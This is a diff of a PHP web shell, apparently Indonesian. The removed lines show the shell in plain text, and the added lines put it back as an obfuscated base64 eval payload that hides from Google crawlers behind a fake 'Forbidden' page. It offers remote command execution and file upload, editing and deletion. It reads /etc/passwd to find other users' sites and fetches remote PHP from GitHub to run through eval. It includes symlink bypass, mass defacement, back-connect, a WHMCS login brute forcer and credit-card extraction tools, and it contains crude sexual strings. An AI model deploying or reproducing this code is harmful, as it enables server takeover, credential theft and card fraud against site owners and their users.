-echo "<a href=\"https://www.facebook.com/Antonio.HsH\"><img class=\"logo\" src=\"https://3.bp.blogspot.com/-kqyfUPouqYk/VtYS0lU-ufI/AAAAAAAAADw/5707sF1NYwo/s1600/MemImg402.gif\" alt=\"Mionoon,..\"></a><br><br>\n";
-echo "<div class='result'><i><font color='#FF0000'>Server ini Tidak Bisa</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf </font>Tidak Di temukan </i></div><br></center>";
-}
-	}
-if ( isset($_GET['Nginceng']) )
-{
-set_time_limit(0);
-@$x162 = fopen('/etc/passwd','r');
-if (!$x162) { die('<b>[+] ERROR | GA BISA BACA /etc/passwd [+]</b>'); }
-$x165 = array();
-$x166 = array();
-$x167 = array();
-$x8c = 0;
-while(!feof($x162))
-{
-$x12 = fgets($x162);
-if ($x8c > 10)
-{
-$x46 = strpos($x12,':');
-$x3a = substr($x12,0,$x46);
-$x158 = '/home/'.$x3a.'/public_html/';
-if (($x3a != ''))
-{
-if (is_readable($x158))
-{
-array_push($x166,$x3a);
-array_push($x165,$x158);
-}
-}
-}
-$x8c++;
-}
-echo '<br><br>';
-echo "<center><b>[+] Ngintip ".sizeof($x165)." Janda"." [+]</b><br/><br/>";
-foreach ($x166 as $x102)
-{
-$xb7 = "/home/$x102/public_html/";
-echo "<a href='?y&#61;$xb7' target='_blank' style='font-weight:bold; color:#;'>$xb7</a><br>";
-}
-echo "<br>";
-echo '</center></body></html>';
-	}
-	if($_GET['extract']){echo"<pre>".shell_exec($_GET["extract"]);}
-if ( isset($_GET['installtmp']) )
-
-{
-$x168 = "https://github.com/antoniola/jancok/blob/master/tmp.zip?raw=true";
-$x29 = file_get_contents($x168);
-$x169 = fopen("tmp.zip" , 'w');
-fwrite($x169,$x29);
-fclose($x169);
-chmod ("tmp.zip" , 0755);
-echo '<font color =\'lime\'>Berhasil Menghinstall<br>';
-	}
-if ( isset($_GET['scmpg']) )
-{
-$x16a = "https://github.com/antoniola/rejeki/blob/master/AppleID.zip?raw=true";
-$x29 = file_get_contents($x16a);
-$x169 = fopen("AppleID.zip" , 'w');
-fwrite($x169,$x29);
-fclose($x169);
-chmod ("AppleID.zip" , 0755);
-echo '<font color =\'lime\'>Berhasil Menghinstalltmp<br>';
-	}
-if ( isset($_GET['AdmR']) )
-{
-$x16b = "https://raw.githubusercontent.com/antoniola/rejeki/master/yoi.php";
-$x29 = file_get_contents($x16b);
-$x169 = fopen("adm.php" , 'w');
-fwrite($x169,$x29);
-fclose($x169);
-chmod ("adm.php" , 0755);
-echo '<font color =\'lime\'>Adminer Berhasil Di Pasang ---> <a href="adm.php"><font color =\'aqua\'>Buka</a> ';
-	}
-	if(isset($_GET['path'])){
-	$xb7 = $_GET['path'];
-	}else{
-	$xb7 = getcwd();
-	}
-	$xb7 = str_replace('\\','/',$xb7);
-	$x16c = explode('/',$xb7);
-
-	foreach($x16c as $x16d=>$x16e){
-	if($x16e == '' && $x16d == 0){
-	$x12e = true;
-	echo '<a href="?path=/">/</a>';
-	continue;
-	}
-	if($x16e == '') continue;
-	echo '<a href="?path=';
-	for($x8c=0;$x8c<=$x16d;$x8c++){
-	echo "$x16c[$x8c]";
-	if($x8c != $x16d) echo "/";
-	}
-	echo '">'.$x16e.'</a>/';
-	}
-	echo '</td></tr><tr><td>';
-	echo '|<a href="?"><input class="button" type="button" value=Home></a>|<a href="?Croot"><input class="button" type="button" value=Upload></a>|<a href="?UaeZ"><input class="button" type="button" value=Upload-Auto-Extract-Zip></a>|<a href="?Nginceng"><input class="button" type="button" value=Jamping></a>|<a href="?CpC"><input class="button" type="button" value=CPanel-Croot></a>|<a href="?UdMs"><input class="button" type="button" value=User-Domain></a>|<a href="?AdmR"><input class="button" type="button" value=Adminer></a>|<a href="?SmpK"><input class="button" type="button" value=Symlink&Crack-CPanel></a>|<a href="?sws=sym"><input class="button" type="button" value=User-Domains-Symlink></a>|<a href="?sws=passwd""><input class="button" type="button" value=Symlink-Bypass></a>|<a href="?sws=read"><input class="button" type="button" value=Symlink-Bypass-Read></a>|<a href="?sws=joomla"><input class="button" type="button" value=Symlink-Mass-Joomla></a>|<a href="?sws=wp"><input class="button" type="button" value=Symlink-Mass-WordPress></a>|<a href="?sws=vb"><input class="button" type="button" value=Symlink-Mass-vBulletin></a>|<a href="?sws=help"><input class="button" type="button" value=Symlink-Info></a>|<a href="?RmDs"><input class="button" type="button" value=Rooting-Massdeface></a>|<a href="?SwPJmPL"><input class="button" type="button" value=Scaner-WP-JoM-Plugin></a>|<a href="?back"><input class="button" type="button" value=Back-Connect></a>|<a href="?Whmcz211"><input class="button" type="button" value=Brute-Whmcs></a>|<a href="?SbN"><input class="button" type="button" value=Sabun></a>|<a href="?XdRpLs"><input class="button" type="button" value=Xmas-Drupal></a>|<a href="?SloROkaN"><input class="button" type="button" value=Symlink-Wp-JM></a>|<a href="?installtmp"><input class="button" type="button" value=api></a>|<a href="?scmpg"><input class="button" type="button" value=Appel></a>|<a href="?extract=unzip tmp.zip"><input class="button" type="button" value=Extract-Api></a>|<a href="?extract=unzip AppleID.zip"><input class="button" type="button" value=Extract-Appel></a>|<a href="?M"><input class="button" type="button" value=Mailer></a>|<a href="?ExE"><input class="button" type="button" value=Email-Extractor></a>|<a href="?PmE"><input class="button" type="button" value=Pemisah-Email></a>|<a href="?ExTrPCc"><input class="button" type="button" value=Extrap-CC></a>|<a href="?DdCc"><input class="button" type="button" value=Decode-CC></a>|
-	</form>
-	</td></tr>';
-	if(isset($_GET['filesrc'])){
-	echo "<tr><td>Current File : ";
-	echo $_GET['filesrc'];
-	echo '</tr></td></table><br />';
-	echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-	}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
-	echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-	if($_POST['opt'] == 'chmod'){
-	if(isset($_POST['perm'])){
-	if(chmod($_POST['path'],$_POST['perm'])){
-	echo '<font color="green">Change Permission Sukses</font><br />';
-	}else{
-	echo '<font color="red">Change Permission Oraiso Cok</font><br />';
-	}
-	}
-	echo '<form method="POST">
-	Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="opt" value="chmod">
-	<input type="submit" value="Go" />
-	</form>';
-	}elseif($_POST['opt'] == 'rename'){
-	if(isset($_POST['newname'])){
-	if(rename($_POST['path'],$xb7.'/'.$_POST['newname'])){
-	echo '<font color="green">Change Name Berhasil</font><br />';
-	}else{
-	echo '<font color="red">Change Name Oraiso Cok</font><br />';
-	}
-	$_POST['name'] = $_POST['newname'];
-	}
-	echo '<form method="POST">
-	New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="opt" value="rename">
-	<input type="submit" value="Go" />
-	</form>';
-	}elseif($_POST['opt'] == 'edit'){
-	if(isset($_POST['src'])){
-	$xb2 = fopen($_POST['path'],'w');
-	if(fwrite($xb2,$_POST['src'])){
-	echo '<font color="green">Edit File Berhasil</font><br />';
-	}else{
-	echo '<font color="red">Edit File Orai Iso Cok</font><br />';
-	}
-	fclose($xb2);
-	}
-	echo '<form method="POST">
-	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-	<input type="hidden" name="path" value="'.$_POST['path'].'">
-	<input type="hidden" name="opt" value="edit">
-	<input type="submit" value="Go" />
-	</form>';
-	}
-	echo '</center>';
-	}else{
-	echo '</table><br /><center>';
-	if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
-	if($_POST['type'] == 'dir'){
-	if(rmdir($_POST['path'])){
-	echo '<font color="green">Delete Dir Sukses</font><br />';
-	}else{
-	echo '<font color="red">Delete Dir Oraiso Cok</font><br />';
-	}
-	}elseif($_POST['type'] == 'file'){
-	if(unlink($_POST['path'])){
-	echo '<font color="green">Delete File Sukses.</font><br />';
-	}else{
-	echo '<font color="red">Delete File Oraiso Cok</font><br />';
-	}
-	}
-	}
-	echo '</center>';
-	$x16f = scandir($xb7);
-	echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-	<tr class="first">
-	<td><center>Name</center></td>
-	<td><center>Size</center></td>
-	<td><center>Permissions</center></td>
-	<td><center>Options</center></td>
-	</tr>';
-
-	foreach($x16f as $x170){
-	if(!is_dir("$xb7/$x170") || $x170 == '.' || $x170 == '..') continue;
-	echo "<tr>
-	<td><a href=\"?path=$xb7/$x170\">$x170</a></td>
-	<td><center>--</center></td>
-	<td><center>";
-	if(is_writable("$xb7/$x170")) echo '<font color="green">';
-	elseif(!is_readable("$xb7/$x170")) echo '<font color="red">';
-	echo perms("$xb7/$x170");
-	if(is_writable("$xb7/$x170") || !is_readable("$xb7/$x170")) echo '</font>';
-
-	echo "</center></td>
-	<td><center><form method=\"POST\" action=\"?option&path=$xb7\">
-	<select name=\"opt\">
-	<option value=\"\"></option>
-	<option value=\"delete\">Delete</option>
-	<option value=\"chmod\">Chmod</option>
-	<option value=\"rename\">Rename</option>
-	</select>
-	<input type=\"hidden\" name=\"type\" value=\"dir\">
-	<input type=\"hidden\" name=\"name\" value=\"$x170\">
-	<input type=\"hidden\" name=\"path\" value=\"$xb7/$x170\">
-	<input type=\"submit\" value=\"[ ___Pijet___ ]\" />
-	</form></center></td>
-	</tr>";
-	}
-	echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
-	foreach($x16f as $x29){
-	if(!is_file("$xb7/$x29")) continue;
-	$x171 = filesize("$xb7/$x29")/1024;
-	$x171 = round($x171,3);
-	if($x171 >= 1024){
-	$x171 = round($x171/1024,2).' MB';
-	}else{
-	$x171 = $x171.' KB';
-	}
-
-	echo "<tr>
-	<td><a href=\"?filesrc=$xb7/$x29&path=$xb7\">$x29</a></td>
-	<td><center>".$x171."</center></td>
-	<td><center>";
-	if(is_writable("$xb7/$x29")) echo '<font color="green">';
-	elseif(!is_readable("$xb7/$x29")) echo '<font color="red">';
-	echo perms("$xb7/$x29");
-	if(is_writable("$xb7/$x29") || !is_readable("$xb7/$x29")) echo '</font>';
-	echo "</center></td>
-	<td><center><form method=\"POST\" action=\"?option&path=$xb7\">
-	<select name=\"opt\">
-	<option value=\"\"></option>
-	<option value=\"delete\">Delete</option>
-	<option value=\"chmod\">Chmod</option>
-	<option value=\"rename\">Rename</option>
-	<option value=\"edit\">Edit</option>
-	</select>
-	<input type=\"hidden\" name=\"type\" value=\"file\">
-	<input type=\"hidden\" name=\"name\" value=\"$x29\">
-	<input type=\"hidden\" name=\"path\" value=\"$xb7/$x29\">
-	<input type=\"submit\" value=\"[ ___Pijet___ ]\" />
-	</form></center></td>
-	</tr>";
-	}
-	echo '</table>
-	</div>';
-	}
-	echo '
-	</BODY>
-	</HTML>';
-	function perms($x29){
-	$x172 = fileperms($x29);
-
-	if (($x172 & 0xC000) == 0xC000) {
-	// Socket
-	$x173 = 's';
-	} elseif (($x172 & 0xA000) == 0xA000) {
-	// Symbolic Link
-	$x173 = 'l';
-	} elseif (($x172 & 0x8000) == 0x8000) {
-	// Regular
-	$x173 = '-';
-	} elseif (($x172 & 0x6000) == 0x6000) {
-	// Block special
-	$x173 = 'b';
-	} elseif (($x172 & 0x4000) == 0x4000) {
-	// Directory
-	$x173 = 'd';
-	} elseif (($x172 & 0x2000) == 0x2000) {
-	// Character special
-	$x173 = 'c';
-	} elseif (($x172 & 0x1000) == 0x1000) {
-	// FIFO pipe
-	$x173 = 'p';
-	} else {
-	// Unknown
-	$x173 = 'u';
-	}
-
-	// Owner
-	$x173 .= (($x172 & 0x0100) ? 'r' : '-');
-	$x173 .= (($x172 & 0x0080) ? 'w' : '-');
-	$x173 .= (($x172 & 0x0040) ?
-	(($x172 & 0x0800) ? 's' : 'x' ) :
-	(($x172 & 0x0800) ? 'S' : '-'));
-
-	// Group
-	$x173 .= (($x172 & 0x0020) ? 'r' : '-');
-	$x173 .= (($x172 & 0x0010) ? 'w' : '-');
-	$x173 .= (($x172 & 0x0008) ?
-	(($x172 & 0x0400) ? 's' : 'x' ) :
-	(($x172 & 0x0400) ? 'S' : '-'));
-
-	// World
-	$x173 .= (($x172 & 0x0004) ? 'r' : '-');
-	$x173 .= (($x172 & 0x0002) ? 'w' : '-');
-	$x173 .= (($x172 & 0x0001) ?
-	(($x172 & 0x0200) ? 't' : 'x' ) :
-	(($x172 & 0x0200) ? 'T' : '-'));
-
-	return $x173;
-	}
-if ( isset($_GET['Croot']) )
-{
-echo '<table style="BORDER-COLLAPSE: collapse" cellspacing="0" bordercolordark="#666666" cellpadding="5" height="1" width="100%" bgcolor="#000000" bordercolorlight="#c0c0c0" border="1"><tr><a bookmark="minipanel" style="font-weight: normal; color: #009900; font-family: verdana; text-decoration: none"><td width="50%" height="1" valign="top" style="font-family: verdana; color: #d9d9d9; font-size: 11px"><center><br><form method="POST" enctype="multipart/form-data"><input type="hidden" name="act" value="upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="file" name="userfile" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="hidden" name="miniform" value="1" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><input type="submit" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #009900"><br><br>';
-}
-{
-$x174 = "";
-$x175 = $x174 . basename($x28['userfile']['name']);
-if (isset($x28['userfile']['name'])) {
-        if (move_uploaded_file($x28['userfile']['tmp_name'], $x175)) {
-                echo "Filemu ". basename($x28['userfile']['name']) ." Berhasil Diupload ^_^ ";
-        } else {
-                echo "Oraiso Diupload Cook!";
-        }
-}
-
-echo '</form></center></td></tr></table></a>';
-}
-if ( isset($_GET['UaeZ']) )
-{
-@session_start(); 
-@error_reporting(0); 
-@ini_set('error_log',NULL); 
-@ini_set('log_errors',0); 
-@ini_set('max_execution_time',0); 
-@ini_set('display_errors', 0);
-@set_time_limit(0); 
-@set_magic_quotes_runtime(0); 
-    function rmdir_recursive($x170) {
-    foreach(scandir($x170) as $x29) {
-    if ('.' === $x29 || '..' === $x29) continue;
-    if (is_dir("$x170/$x29")) rmdir_recursive("$x170/$x29");
-    else unlink("$x170/$x29");
-    }
-     
-    rmdir($x170);
-    }
-     
-    if($x28["zip_file"]["name"]) {
-    $xb8 = $x28["zip_file"]["name"];
-    $x176 = $x28["zip_file"]["tmp_name"];
-    $x9a = $x28["zip_file"]["type"];
-     
-    $x48 = explode(".", $xb8);
-    $x177 = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
-    foreach($x177 as $x178) {
-    if($x178 == $x9a) {
-    $x179 = true;
-    break;
-    }
-    }
-     
-    $x17a = strtolower($x48[1]) == 'zip' ? true : false;
-    if(!$x17a) {
-    $x19 = "The file you are trying to upload is not a .zip file. Please try again.";
-    }
-     
-    /* PHP current path */
-    $xb7 = dirname(__FILE__).'/'; // absolute path to the directory where zipper.php is in
-    $x17b = basename ($xb8, '.zip'); // absolute path to the directory where zipper.php is in (lowercase)
-    $x17b = basename ($x17b, '.ZIP'); // absolute path to the directory where zipper.php is in (when uppercase)
-     
-    $x17c = $xb7 . $x17b; // target directory
-    $x17d = $xb7 . $xb8; // target zip file
-     
-    /* create directory if not exists', otherwise overwrite */
-    /* target directory is same as filename without extension */
-     
-    if (is_dir($x17c)) rmdir_recursive ( $x17c);
-     
-     
-    mkdir($x17c, 0777);
-     
-     
-    /* here it is really happening */
-     
-    if(move_uploaded_file($x176, $x17d)) {
-    $x17e = new ZipArchive();
-    $xc2 = $x17e->open($x17d); // open the zip file to extract
-    if ($xc2 === true) {
-    $x17e->extractTo($x17c); // place in the directory with same name
-    $x17e->close();
-     
-    unlink($x17d);
-    }
-    $x19 = "Auuugghhh,... Kontolmu Tante Masukin di Dalam Vagina Tante Auuugghhh,... ";
-    } else {	
-    $x19 = "Ora Iso Mlebu COK Kontolmu Masuk Angin Paleng ";
-    }
-    }
-     
-     
-
-
-echo '<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><meta http-equiv="Content-Language" content="fr">
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-<font class="hk2" style="text-shadow: 1px -1px 8px;"> 
-<!--by hacker sakit hati--> 
-<body style="background-color:#000000;background-image:url(https://lh3.googleusercontent.com/-4mu4UeGrMZ4/Vnln5iS9iyI/AAAAAAAAALU/peGMSKQ8Fo0/w859-h483-n-no/541418_130940813763941_862797218_n.jpg);background-repeat:no-repeat;background-position:top;" bgcolor="#000000"><center>
-<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
-<div style="-moz-border-radius: webkit-border-radius: 10px 5px 10px 5px; background-color: #; border-radius: 10px; border: 1px solid white ;">
-<style>
-body,table{background:  ; font-family:Verdana,tahoma; color: white ; font-size:10px }
-A:link {text-decoration: none;color: aqua;}
-A:active {text-decoration: none;color: aqua;}
-A:visited {text-decoration: none;color: lime;}
-A:hover {text-decoration: underline; color: Fuchsia;}
-#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
-input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
-</style><style type="text/css"><!-- a:link{color:#ffffff;text-decoration:none}--></style> ';
-{if($x19) echo "<p>$x19</p>";}
-echo '<form enctype="multipart/form-data" method="post" action=""><label>Silahkan Masukan Kontol Anda <input type="file" name="zip_file" /></label><input type="submit" name="submit" value="Upload" /></form></body></html>';
-}
-if ( isset($_GET['ExE']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/email.html";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['PmE']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/exd.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-
-if ( isset($_GET['SbN']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/65243twazfsddd6ur.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-
-	if ( isset($_GET['SmpK']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/sempak.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['RmDs']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/53278798366rmd.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['SwPJmPL']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/ad432141asdfsdj%20wpjmbrt.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['back']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/749209288231546dcnfdr343.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['Whmcz211']) )
-{
-
-echo "<html><head><link rel=\"SHORTCUT ICON\" href=\"http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif\"><title> >-|I|-> HsH 2011 <-|I|-< </title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"><style> body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px } A:link {text-decoration: none;color: aqua;} A:active {text-decoration: none;color: aqua;} A:visited {text-decoration: none;color: lime;} A:hover {text-decoration: underline; color: Fuchsia;} #new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;} input:hover,tr:hover,td:hover{background-color:  ; color: aqua;} </style><style type=\"text/css\"></style><style type=\"text/css\"></style></head><center><font size=\"7\" color=\"#0078AA\">HSH WHMCS BRUTE FORCE 2011 </font></center><center>  <form method=\"post\"> <center> \n"; 
-echo "<textarea rows='15' cols='45' name=\"site\">http://target.com/admin/</textarea>\n"; 
-echo "<textarea rows='15' cols='30' name=\"user\">admin \n"; 
-echo "demo\n"; 
-echo "admin123\n"; 
-echo "</textarea><textarea rows='15' cols='30' name=\"pass\">\n"; 
-echo "admin\n"; 
-echo "123456\n"; 
-echo "password\n"; 
-echo "102030\n"; 
-echo "123123\n"; 
-echo "12345\n"; 
-echo "123456789\n"; 
-echo "pass\n"; 
-echo "test\n"; 
-echo "admin123\n"; 
-echo "demo\n"; 
-echo "!@#$%^\n"; 
-echo "</textarea><br><input type=\"submit\" name='start' value=\" [ P L A Y ] \" /></form></center>\n";
- set_time_limit(0); 
-    error_reporting(0); 
-    @apache_setenv('no-gzip', 1); 
-    @ini_set('zlib.output_compression', 0); 
-    @ini_set('implicit_flush', 1); 
-    for($x8c=0;$x8c<= ob_get_level(); $x8c++) 
-    { 
-        ob_end_flush(); 
-    } 
-    ob_implicit_flush(1); 
- function check_ip($x17f) { 
-    if ((!empty($x17f) && ip2long($x17f) != 0 - 1) && ip2long($x17f) != false) { 
-        $x180 = array(array("0.0.0.0", "2.255.255.255"), array("10.0.0.0", "10.255.255.255"), array("127.0.0.0", "127.255.255.255"), array("169.254.0.0", "169.254.255.255"), array("172.16.0.0", "172.31.255.255"), array("192.0.2.0", "192.0.2.255"), array("192.168.0.0", "192.168.255.255"), array("255.255.255.0", "255.255.255.255")); 
-        foreach ($x180 as $x11d) { 
-            $x181 = ip2long($x11d[0]); 
-            $x182 = ip2long($x11d[1]); 
-
-            if ($x181 <= ip2long($x17f) && ip2long($x17f) <= $x182) { 
-                return false; 
-                continue; 
-            } 
-        } 
-
-        return true; 
-    } 
-
-    return false; 
-} 
-function login($x0f,$x102,$x114){ 
-    global $x17f; 
-
-    $x183 = array('username'=>$x102,'password'=>$x114,'rememberme'=>'on'); 
-
-    $xf6 = curl_init(); 
-    curl_setopt($xf6,CURLOPT_URL,"$x0f/dologin.php"); 
-    curl_setopt($xf6,CURLOPT_SSL_VERIFYHOST,false); 
-    curl_setopt($xf6,CURLOPT_SSL_VERIFYPEER,false); 
-    curl_setopt($xf6,CURLOPT_RETURNTRANSFER,true); 
-    curl_setopt($xf6,CURLOPT_HTTPHEADER,array("CLIENT-IP: $x17f")); 
-    curl_setopt($xf6,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; rv:17.0) Gecko/20100101 Firefox/17.0'); 
-    curl_setopt($xf6,CURLOPT_POST,true); 
-    curl_setopt($xf6,CURLOPT_POSTFIELDS,$x183); 
-    curl_setopt($xf6,CURLOPT_HEADER,true); 
-    curl_setopt($xf6,CURLOPT_REFERER,"$x0f/login.php"); 
-    $xe7 = curl_exec($xf6); 
-    curl_close($xf6); 
-    //echo $xe7; 
-    if(preg_match('/Location\: index\.php/',$xe7)){ 
-        return true; 
-    }else{ 
-        return false; 
-    } 
-} 
-if($_POST['start']){ 
-$xb2=fopen("HsH-whmcs.txt","a+"); 
-
-
- foreach(explode("\n",$_POST['site']) as $xf4){ 
-   $xf4=trim($xf4); 
-foreach(explode("\n",$_POST['user']) as $x102){ 
-    $x102 = trim($x102); 
-    foreach(explode("\n",$_POST['pass']) as $x114){ 
-        $x114 = trim($x114); 
-        echo "<font color='lime'><br>Scann $xf4 | $x102 | $x114<br></font> "; 
-
-        while (true) { 
-            $x17f = long2ip(rand(11111,99999999999)); 
-            if(!@in_array($x17f,$x184)&&check_ip($x17f)){ 
-                $x184[] = $x17f; 
-                break; 
-            } 
-        } 
-
-        if(login($xf4,$x102,$x114)){ 
-            echo "<center><font size='5' color='aqua'><br>[+] $xf4 <br> [+]user : $x102.<br> password:$x114\n<br></font></center>"; 
-
-            fwrite($xb2,"Target : $xf4\r\nUsername : $x102\r\nPassword : $x114\r\n===================================\r\n"); 
-            break; 
-        }else{ 
-            echo "Ora Kenek COK \n"; 
-        } 
-    } 
-} 
-} 
-
-
-    } 
-
-
-}
-
-if ( isset($_GET['ExTrPCc']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/7ryqoioaiwjizsuh%5Bq9ueraidkd3XtR4p4c35.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-if ( isset($_GET['DdCc']) )
-{
-
-$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/63y5w6789tuyfiuxtydcfczgdxthgfsCr4xD3C0dCC586.php";
-$x10 = file_get_contents($x0f);
-eval('?>'.$x10);
-
-
-}
-?>
+<?php eval("?>".base64_decode("Ci8qY29kZXIgOiBJbmRvbmVzaWEgQ3Jvb3QgQ29kZXIqLwokeDBiID0gIjI3YjkyYjY4MWM0YTFl
+MjU1ZjY2NTU2YTQyY2E2YmVmIjsKJHgwYyA9ICIjMDBGRjY2IjsKJHgwZCA9ICdGaWxlc01hbic7
+CkBkZWZpbmUoJ1NFTEZfUEFUSCcsIF9fRklMRV9fKTsKaWYoIHN0cnBvcygkX1NFUlZFUlsnSFRU
+UF9VU0VSX0FHRU5UJ10sJ0dvb2dsZScpICE9PSBmYWxzZSApIHsKICAgIGhlYWRlcignSFRUUC8x
+LjAgNDA0IE5vdCBGb3VuZCcpOwogICAgZXhpdDsKfQpAc2Vzc2lvbl9zdGFydCgpOwpAZXJyb3Jf
+cmVwb3J0aW5nKDApOwpAaW5pX3NldCgnZXJyb3JfbG9nJyxOVUxMKTsKQGluaV9zZXQoJ2xvZ19l
+cnJvcnMnLDApOwpAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsKQHNldF90aW1lX2xp
+bWl0KDApOwpAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOwpAZGVmaW5lKCdWRVJTSU9OJywg
+JzIuMicpOwppZiggZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSApIHsKICAgIGZ1bmN0aW9uIHN0cmlw
+c2xhc2hlc19hcnJheSgkeDBlKSB7CiAgICAgICAgcmV0dXJuIGlzX2FycmF5KCR4MGUpID8gYXJy
+YXlfbWFwKCdzdHJpcHNsYXNoZXNfYXJyYXknLCAkeDBlKSA6IHN0cmlwc2xhc2hlcygkeDBlKTsK
+ICAgIH0KICAgICRfUE9TVCA9IHN0cmlwc2xhc2hlc19hcnJheSgkX1BPU1QpOwp9CmZ1bmN0aW9u
+IHByaW50TG9naW4oKSB7CiAgICA/Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhh
+dmUgcGVybWlzc2lvbiB0byBhY2NlcyBvbiB0aGlzIHNlcnZlci48L3A+CjxhZGRyZXNzPkFkZGl0
+aW9uYWxseSwgYSA0MDQgTm90IEZvdW5kIGVycm9yIHdhcyBlbmNvdW50ZXJlZCB3aGlsZSB0cnlp
+bmcgdG8gdXNlIGFuIEVycm9yRG9jdW1lbnQgdG8gaGFuZGxlIHRoZSByZXF1ZXN0LjwvYWRkcmVz
+cz4KICAgIDxzdHlsZT4KICAgICAgICBpbnB1dCB7IG1hcmdpbjowO2JhY2tncm91bmQtY29sb3I6
+I2ZmZjtib3JkZXI6MXB4IHNvbGlkICNmZmY7IH0KICAgIDwvc3R5bGU+CiAgICA8ZGl2IHN0eWxl
+PSdwb3NpdGlvbjogZml4ZWQ7IGJvdHRvbTogMHB4OyBsZWZ0OiAwcHg7IHdpZHRoOiAwcHg7Jz4g
+IAogICAgPGZvcm0gbWV0aG9kPXBvc3Q+CiAgICA8aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPXBh
+c3M+CiAgICA8L2Zvcm0+PC9kaXY+CiAgICAKPD9waHAKICAgIGV4aXQ7Cn0KaWYoICFpc3NldCgg
+JF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSApKQoJaWYoIGVtcHR5KCAkeDBi
+ICkgfHwKCQkoIGlzc2V0KCAkX1BPU1RbJ3Bhc3MnXSApICYmICggbWQ1KCRfUE9TVFsncGFzcydd
+KSA9PSAkeDBiKSApICkKCQkkX1NFU1NJT05bbWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSldID0g
+dHJ1ZTsKCWVsc2UKCQlwcmludExvZ2luKCk7Ci8vRHV3dXIgRGV3ZSAvLwppZiAoIGlzc2V0KCRf
+R0VUWydTbG9ST2thTiddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
+bnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyLzM0OTcxcTZleWRyaWV1b2lzbDByMGs0Ti5w
+aHAiOwokeDEwID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+Jy4keDEwKTsKCgp9
+CmlmICggaXNzZXQoJF9HRVRbJ1hkUnBMcyddKSApCnsKCiR4MGYgPSAiaHR0cHM6Ly9yYXcuZ2l0
+aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyLzg3M3I4NzJ5aWV1aHc5
+ODdpcGwwMGN1cC5waHAiOwokeDEwID0gZmlsZV9nZXRfY29udGVudHMoJHgwZik7CmV2YWwoJz8+
+Jy4keDEwKTsKCgp9CmlmICggaXNzZXQoJF9HRVRbJ00nXSkgKQoJewoJLy8gSHNIIE1haWxlciBF
+eHRyaW1lIENhcmQKCWVycm9yX3JlcG9ydGluZygwKTsKCWZ1bmN0aW9uIHF1ZXJ5X3N0cigkeDEx
